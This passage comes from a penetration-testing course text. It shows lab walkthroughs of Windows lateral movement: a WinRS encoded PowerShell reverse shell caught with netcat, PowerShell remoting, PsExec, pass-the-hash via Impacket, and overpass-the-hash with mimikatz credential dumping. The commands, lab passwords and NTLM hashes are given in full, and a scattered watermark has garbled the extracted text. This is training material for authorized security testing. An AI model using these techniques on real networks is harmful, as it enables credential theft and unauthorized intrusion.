corp\jen
Listing 834 - Executing commands remotely via WinRS
The output confirms that we have indeed executed the commands remotely on FILES04.
1139 (Wikipedia, 2022), https://en.wikipedia.org/wiki/WS-Management
1140 (Microsoft, 2022), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 782
Made in Morocco
Penetration Testing with Kali Linux
For WinRS to work, the domain user needs to be part of the Administrators or
Remote Management Users group on the target host.
To convert this technique into a full lateral movement scenario, we just need to replace the
previous commands with the base64 encoded reverse-shell we wrote earlier.
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
Listing 835 - Running the reverse-shell payload through WinRS
y
Once we run the above command after having set up a Netcat listener, we are welcomed with a
reverse-shell from FILE04.
k
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ... s
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
PS C:\Users\jen> hostname
o
FILES04
PS C:\Users\jen> whoami
corp\jen
n
Listing 836 - Veriyfing the origin of the WinRS reverse-shell
PowerShell also has WinRM built-in capabilities called PowerShell remoting,1141 which can be
i
invoked via the New-PSSession cmdlet by providing the IP of the target host along with the
z
credentials in a credential object format similar to what we did previously.
PS C:\Users\jeff> $usernaDme = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -
Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential
$username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Id Name ComputerName ComputerType State ConfigurationName
Availability
-- ---- ------------ ------------ ----- -----------------
------------
1 WinRM1 192.168.50.73 RemoteMachine Opened Microsoft.PowerShell
Available
Listing 837 - Establishing a PowerShell Remote Session via WinRM
To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed
by the session ID.
1141 (Microsoft, 2022), https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-
7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 783
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
Listing 838 - Inspecting the PowerShell Remoting session
Once more, we’ve proven that the session is originating from the target host through yet another
lateral movement technique.
23.1.2 PsExec
PsExec is a very versatile tool that is part of the SysInternals1142 suite developed by Mark
Russinovich. It’s intended to replace telnet-like applications and provide remote execution of
y
processes on other systems through an interactive console.
In order to misuse this tool for lateral movement, a few requisites must be met. To begin, the user
k
that authenticates to the target machine needs to be part of the Administrators local group. In
addition, the ADMIN$ share must be available and File and Printer Sharing has to be turned on.
s
Luckily for us, the last two requirements are already met as they are the default settings on
modern Windows Server systems.
o
In order to execute the command remotely, PsExec performs the following tasks:
• Writes psexesvc.exe into the C: directonry
• Creates and spawns a service on the remote host
i
• Runs the requested program/command as a child process of psexesvc.exe
z
For this scenario, let’s assume we have RDP access as the offsec local administrator on
CLIENT74 as we already disDcovered its clear-text password on FILES04.
Even though PsExec is not installed by default on Windows, we can easily transfer it on our
compromised machine. For the sake of usability, the whole SysInternals suite is available on
CLIENT74. Once logged in as the offsec user on CLIENT74, we can run the 64-bit version of
PsExec from C:.
In order to start an interactive session on the remote host, we need to invoke PsExec64.exe with
the -i argument, followed by the target hostname prepended with two backslashes. We’ll then
specify corp\jen as domain\username and Nexus123! as password with the -u and -p arguments
respectively. Lastly, we include the process we want to execute remotely, which is a command
shell in this case.
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123!
cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
1142 (Microsoft, 2022), https://docs.microsoft.com/en-us/sysinternals/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 784
Made in Morocco
Penetration Testing with Kali Linux
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>hostname
FILES04
C:\Windows\system32>whoami
corp\jen
Listing 839 - Obtaining an Interactive Shell on the Target System with PsExec
Listing 839 confirms that we obtained an interactive shell directly on the target system as the
local administrator jen domain account, without involving our Kali machine to catch a reverse
shell.
23.1.3 Pass the Hash y
The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or
k
service using a user’s NTLM hash instead of the associated plaintext password. Note that this will
not work for Kerberos authentication but only for servers or services using NTLM authentication.
s
This lateral movement sub-technique is also mapped in the MITRE Framework under the Use
Alternate Authentication Material general technique.
o
Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain
code execution, including PsExec from Metasploit,1143 Passing-the-hash toolkit,1144 and
Impacket.1145 The mechanics behind themn are more or less the same in that the attacker
connects to the victim using the Server Message Block (SMB) protocol and performs
authentication using the NTLM hash.1146
i
z
Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example,
cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes.1147 This is
done using the Service ConDtrol Manager1148 API.
Unless we want to gain remote code execution, PtH does not need to create a
Windows service for any other usage, such as accessing an SMB share.
Similar to PsExec, this technique requires an SMB connection through the firewall (commonly
port 445) and the Windows File and Printer Sharing feature to be enabled. These requirements are
common in internal enterprise environments.
This lateral movement technique also requires the admin share called ADMIN$ to be available. In
order to establish a connection to this share, the attacker must present valid credentials with local
1143 (Metasploit, 2019), https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/
1144 (@byt3bl33d3r, 2015), https://github.com/byt3bl33d3r/pth-toolkit
1145 (Core Security, 2022), https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py
1146 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/windows/desktop/aa365234(v=vs.85).aspx
1147 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590(v=vs.85).aspx
1148 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 785
Made in Morocco
Penetration Testing with Kali Linux
administrative permissions. In other words, this type of lateral movement typically requires local
administrative rights.
Note that PtH uses the NTLM hash legitimately. However, the vulnerability lies in the fact that we
gained unauthorized access to the password hash of a local administrator.
To demonstrate this, we can use wmiexec from the Impacket suite from our local Kali machine
against the local administrator account on FILES04. We are going to invoke the command by
passing the local Administrator hash that we gathered in a previous Module and then specifying
the username along with the target IP.
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E
PI:EMAIL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
y
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands k
C:\>hostname
FILES04
s
C:\>whoami
files04\administrator
o
Listing 840 - Passing the hash using Impacket wmiexec
In this case, we used NTLM authentication to obtain code execution on the Windows 2022 server
n
directly from Kali, armed only with the user’s NTLM hash.
If the target was sitting behind a network that was only reachable through our initial
i
compromised access, we could perform this very same attack by pivoting and proxying through
z
the first host as learned in previous Modules.
This method works for AcDtive Directory domain accounts and the built-in local administrator
account. However, due to the 2014 security update,1149 this technique can not be used to
authenticate as any other local admin account.
23.1.4 Overpass the Hash
With overpass the hash,1150 we can “over” abuse an NTLM user hash to gain a full Kerberos Ticket
Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
To demonstrate this, let’s assume we have compromised a workstation (or server) that jen has
authenticated to. We’ll also assume that the machine is now caching their credentials (and
therefore, their NTLM password hash).
To simulate this cached credential, we will log in to the Windows 10 CLIENT76 machine as jeff
and run a process as jen, which prompts authentication.
1149 (Microsoft, 2022), https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-
protection-a
1150 (Skip Duckwall and Benjamin Delphy, 2014), https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-
Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf [pth_mitre]: (MITRE, 2022), https://attack.mitre.org/techniques/T1550/002/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 786
Made in Morocco
Penetration Testing with Kali Linux
The simplest way to do this is to right-click the Notepad icon on the desktop then shift-left click
“show more options” on the popup, yielding the options in Figure 285.
y
k
s
o
n
i
z
D
Figure 285: Enabling extra options
From here, we enter jen as the username along with the associated password, which will launch
Notepad in the context of that user. After successful authentication, jen’s credentials will be
cached on this machine.
We can validate this with the sekurlsa::logonpasswords command from mimikatz after having
spawned an Administrative shell. The command will dump the cached password hashes.
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 787
Made in Morocco
Penetration Testing with Kali Linux
...
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session : Interactive from 0
User Name : jen
Domain : CORP
Logon Server : DC1
Logon Time : 2/27/2023 7:43:20 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1124
msv :
[00000003] Primary
* Username : jen
* Domain : CORP
* NTLM : 369def79d8372408bf6e93364cc93075
* SHA1 : faf35992ad0df4fc418af543e5f4cb08210830d4
* DPAPI : ed6686fedb60840cd49b5286a7c08fa4
tspkg : y
wdigest :
* Username : jen
* Domain : CORP k
* Password : (null)
kerberos :
s
* Username : jen
* Domain : CORP.COM
* Password : (null) o
ssp :
credman :
... n
Listing 841 - Dumping password hash for ‘jen’
This output shows jen’s cached creidentials under jen’s own session. It includes the NTLM hash,
which we will leverage to overpaszs the hash.
The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into
D
a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the
sekurlsa::pth command from Mimikatz.
The command requires a few arguments and creates a new PowerShell process in the context of
jen. This new PowerShell prompt will allow us to obtain Kerberos tickets without performing
NTLM authentication over the network, making this attack different than a traditional pass-the-
hash.
As the first argument, we specify /user: and /domain:, setting them to jen and corp.com
respectively. We’ll specify the NTLM hash with /ntlm: and finally, use /run: to specify the process
to create (in this case, PowerShell).
mimikatz # sekurlsa::pth /user:jen /domain:corp.com
/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
user : jen
domain : corp.com
program : powershell
impers. : no
NTLM : 369def79d8372408bf6e93364cc93075
| PID 8716
| TID 8348
| LSA Process is now R/W
| LUID 0 ; 16534348 (00000000:00fc4b4c)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 788
Made in Morocco
Penetration Testing with Kali Linux
\_ msv1_0 - data copy @ 000001F3D5C69330 : OK !
\_ kerberos - data copy @ 000001F3D5D366C8
\_ des_cbc_md4 -> null
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ *Password replace @ 000001F3D5C63B68 (32) -> null
Listing 842 - Creating a process with a different users NTLM password hash
At this point, we have a new PowerShell session that allows us to execute commands as jen.
At this point, running the whoami command on the newly creyated PowerShell
session would show jeff’s identity instead of jen. While this could be confusing,
this is the intended behavior of the whoami utility whickh only checks the current
process’s token and it does not inspect any imported kerberos tickets
s
Let’s list the cached Kerberos tickets with klist.
o
PS C:\Windows\system32> klist
n
Current LogonId is 0:0x1583ae
Cached Tickets: (0) i
Listing 843 - Listing Kerberos tickets